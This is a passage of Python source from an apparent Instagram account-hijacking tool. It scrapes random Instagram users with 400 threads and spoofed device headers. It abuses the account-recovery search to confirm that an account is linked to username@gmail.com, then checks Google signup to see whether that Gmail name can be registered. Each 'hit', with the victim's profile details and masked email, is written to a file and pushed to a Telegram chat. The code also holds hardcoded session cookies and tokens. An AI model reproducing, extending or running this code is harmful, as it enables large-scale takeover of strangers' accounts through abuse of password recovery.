                + "\\\",\\\"aaccs\\\":\\\"" + secrets.token_urlsafe(32)
                + "\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\","
                "\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},"
                "\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\","
                "\"fetched_email_token_list\":{},\"search_query\":\"" + email + "\","
                "\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,"
                "\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\","
                "\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,"
                "\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,"
                "\"ig_android_qe_device_id\":\"" + device + "\","
                "\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\","
                "\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,"
                "\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,"
                "\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},"
                "\"server_params\":{\"event_request_id\":\"" + str(uuid.uuid4()) + "\","
                "\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,"
                "\"device_id\":\"" + android + "\",\"login_surface\":\"login_home\","
                "\"waterfall_id\":\"" + str(uuid.uuid4()) + "\","
                "\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,"
                "\"context_data\":\"\",\"login_entry_point\":\"logged_out\","
                "\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\"" + family + "\","
                "\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\","
                "\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,"
                "\"qe_device_id\":\"" + device + "\"}}"
            ),
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
            'accept-language': "en-IN, en-US",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': android,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_IN",
            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
            'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
            'x-pigeon-rawclienttime': str(time.time()),
            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
        }
        response = loc_session.post(
            "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
            data=payload, headers=headers, timeout=20
        )
        if email in response.text:
            _m2_good_insta += 1
            return True
        elif 'Sorry, something' in response.text:
            _m2_limit += 1
            return False
        else:
            _m2_bad_insta += 1
            return False
    except Exception:
        return False


# ── Gmail availability check ───────────────────────────────────────────────────

def _m2_check_gmail(usr, loc_session):
    """Check Gmail username availability via google.txt TL. Returns True if available."""
    global _m2_taken, _m2_bad_email
    try:
        if not os.path.exists("google.txt"):
            return False
        with open("google.txt", "r") as ys:
            tl = ys.read().strip()
        if not tl:
            return False
        url     = "https://accounts.google.com/_/signup/usernameavailability"
        params  = {'hl': "en-GB", 'TL': tl, '_reqid': "446000", 'rt': "j"}
        payload = {
            'continue': "https://accounts.google.com/ManageAccount?nc=1",
            'f.req': "[\"TL:" + tl + "\",\"" + usr + "\",0,0,1,null,1,2464]",
            'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
            'cookiesDisabled': "false",
            'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
            'gmscoreversion': "null",
            'flowName': "GlifWebSignIn",
            'checkConnection': "youtube:301",
            'checkedDomains': "youtube",
            'pstMsg': "1",
            '': ""
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
            'x-same-domain': "1",
            'google-accounts-xsrf': "1",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
            'origin': "https://accounts.google.com",
            'x-client-data': "CP/xygE=",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl,
            'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
        }
        resp = loc_session.post(url, params=params, data=payload, headers=headers, timeout=20)
        if '"gf.uar",1' in resp.text:
            return True
        else:
            _m2_taken += 1
            return False
    except Exception:
        _m2_bad_email += 1
        return False


# ── Masked email fetch ─────────────────────────────────────────────────────────

def _m2_get_masked(query):
    """Fetch masked email from IG graphql account-recovery search."""
    try:
        url = "https://www.instagram.com/api/graphql"
        payload = {
            'av': "0", '__d': "www", '__user': "0", '__a': "1", '__req': "f",
            '__hs': "20563.HYP:instagram_web_pkg.2.1...0", 'dpr': "3",
            '__ccg': "GOOD", '__rev': "1037676804", '__s': "nz2w5z:1vm2xs:94sap8",
            '__hsi': "7630740602831122681",
            '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
            '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
            '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
            '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
            '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
            '__comet_req': "7",
            'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
            'jazoest': "22394",
            '__spin_r': "1037676804",
            '__spin_b': "trunk",
            '__spin_t': "1776670246",
            '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
            'qpl_active_flow_ids': "516759801",
            'fb_api_caller_class': "RelayModern",
            'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
            'server_timestamps': "true",
            'variables': "{\"params\":{\"event_request_id\":\"7ca5daae-5770-42dd-b77b-0cf23a865a7f\",\"next_uri\":\"\",\"search_query\":\"" + query + "\",\"waterfall_id\":\"553aadae-3ec5-4031-8395-efbabcc670ce\"}}",
            'doc_id': "26178667145161478",
            'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
            'sec-ch-ua-model': "\"\"",
            'x-ig-app-id': "936619743392459",
            'x-ig-max-touch-points': "5",
            'sec-ch-ua-mobile': "?0",
            'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
            'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
            'sec-ch-ua-platform-version': "\"\"",
            'x-asbd-id': "359341",
            'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
            'sec-ch-prefers-color-scheme': "dark",
            'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
            'sec-ch-ua-platform': "\"Linux\"",
            'origin': "https://www.instagram.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.instagram.com/accounts/password/reset/",
            'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
        }
        response = requests.post(url, data=payload, headers=headers, timeout=20)
        masked = next(
            (i["contact_point"] for i in
             response.json()["data"]["caa_ar_ig_account_search"]["contact_points"]
             if i["type"] == "EMAIL"),
            None
        )
        return masked
    except Exception:
        return None


# ── Hit message ────────────────────────────────────────────────────────────────

def _m2_format_hit(hit_num, username, email, user_data, gmail_masked):
    """Format hit message in the LIGHT SPEED style."""
    business  = user_data.get('is_business', None)
    followers = user_data.get('follower_count', None)
    followings = user_data.get('following_count', None)
    posts     = int(user_data.get('media_count') or 0)
    private   = user_data.get('is_private', None)
    name      = user_data.get('full_name', None)
    biography = user_data.get('biography', None)

    business  = business  if business  is not None else 'None'
    followers = followers if followers is not None else 'None'
    followings = followings if followings is not None else 'None'
    private   = private   if private   is not None else 'None'
    name      = name      if name      is not None else 'None'
    biography = biography if biography is not None else 'None'
    mail      = gmail_masked if gmail_masked else 'None'
    meta      = 'True' if posts > 2 else 'False'

    return (
        f"\n💎 WEYN HIGH POST #{hit_num} 💎\n\n"
        f"ʙᴜsɪɴᴇss  ⋆ {business}\n"
        f"ᴍᴇᴛᴀ     ⋆ {meta}\n"
        f"ɴᴀᴍᴇ     ⋆ {name}\n"
        f"ᴜsᴇʀ     ⋆ @{username}\n"
        f"ғᴏʟʟᴏᴡᴇʀs ⋆ {followers}\n"
        f"ғᴏʟʟᴏᴡɪɴɢ ⋆ {followings}\n"
        f"ᴘᴏsᴛs    ⋆ {posts}\n"
        f"ʙɪᴏ      ⋆ {biography}\n"
        f"ᴇᴍᴀɪʟ    ⋆ {email}\n"
        f"ᴍᴀsᴋᴇᴅ   ⋆ {mail}\n"
        f"ᴜʀʟ      ⋆ instagram.com/{username}\n\n"
        "─── @jinbelowg @weyn_vouches ───"
    )


# ── Save hit ───────────────────────────────────────────────────────────────────

def _m2_save_hit(username, user_data, token, chat_id):
    """Format M2 hit, write to file, notify Telegram."""
    global _m2_hits, _m2_total
    try:
        posts = int(user_data.get('media_count') or 0)
        if posts < 20:
            return
        email       = f"{username}@gmail.com"
        gmail_masked = _m2_get_masked(username)

        with _m2_hit_lock:
            _m2_hits  += 1
            _m2_total += 1
            hit_num    = _m2_hits

        msg = _m2_format_hit(hit_num, username, email, user_data, gmail_masked)

        _save_hit_to_file(msg)

        import json as _json
        hit_entry = _json.dumps({"e": email, "p": posts})
        with _m2_found_lock:
            _m2_found_emails.append(hit_entry)
            if len(_m2_found_emails) > 200:
                _m2_found_emails.pop(0)

        _web_state['hits']        = _m2_hits
        _web_state['total']       = _m2_total
        _web_state['recent_hits'] = list(_m2_found_emails[-20:])

        _send_telegram(token, chat_id, msg)

    except Exception:
        pass


# ── Scanner worker ─────────────────────────────────────────────────────────────

def _m2_get_usernames(token, chat_id, min_posts, stop_event):
    """Single worker: scrape random IG user IDs, filter by posts, run lookup → Gmail check → hit."""
    global _m2_scanned
    loc_session = _register_session(requests.Session())
    _min_posts = max(20, int(min_posts) if min_posts else 20)
    while not (stop_event and stop_event.is_set()):
        try:
            csrf, lsd = _m2_load_tokens()
            cookies = {
                'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'x-ig-app-id': '936619743392459',
                'x-fb-lsd': lsd,
                'sec-ch-prefers-color-scheme': 'light',
                'x-csrftoken': csrf,
                'sec-ch-ua-platform': '"Android"',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin'
            }
            payload = {
                'lsd': lsd,
                'variables': json.dumps({
                    "userID": random.randint(2500000000, 21254029834),
                    "username": "cristiano"
                }),
                'doc_id': '7717269488336001',
            }
            resp = loc_session.post(
                'https://www.instagram.com/api/graphql',
                headers=headers, data=payload, cookies=cookies, timeout=10
            )
            _m2_scanned += 1
            try:
                ud = resp.json().get('data', {}).get('user') or {}
            except Exception:
                continue
            username = ud.get('username')
            posts    = int(ud.get('media_count') or 0)
            uid      = ud.get('pk')
            if username and uid and posts >= _min_posts:
                email = username + '@gmail.com'
                if _m2_lookup(email, loc_session):
                    if _m2_check_gmail(username, loc_session):
                        _m2_save_hit(username, ud, token, chat_id)
        except Exception:
            pass


# ── Web entry point ────────────────────────────────────────────────────────────

def run_method2_web(token, chat_id, min_followers, stop_event):
    global _m2_hits, _m2_bad_insta, _m2_bad_email, _m2_good_insta
    global _m2_total, _m2_taken, _m2_limit, _m2_found_emails, _m2_scanned

    _m2_hits = _m2_bad_insta = _m2_bad_email = _m2_good_insta = 0
    _m2_total = _m2_taken = _m2_limit = _m2_scanned = 0
    _m2_found_emails = []

    _write_session_separator(2)
    _web_state.update({
        'running': True, 'method': '2',
        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
        'taken': 0, 'limit': 0, 'total': 0, 'verified': 0,
        'recent_hits': [], 'tg_status': '', 'tg_error': '',
    })

    Thread(target=_m2_get_tl,     daemon=True).start()
    Thread(target=_m2_get_tokens, daemon=True).start()

    NUM_WORKERS = 400
    try:
        while not stop_event.is_set():
            with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
                futures = [
                    executor.submit(_m2_get_usernames, token, chat_id, min_followers, stop_event)
                    for _ in range(NUM_WORKERS)
                ]
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        pass
            if not stop_event.is_set():
                time.sleep(0.5)
    finally:
        _web_state['running'] = False


def main():
    pass


if __name__ == "__main__":
    main()
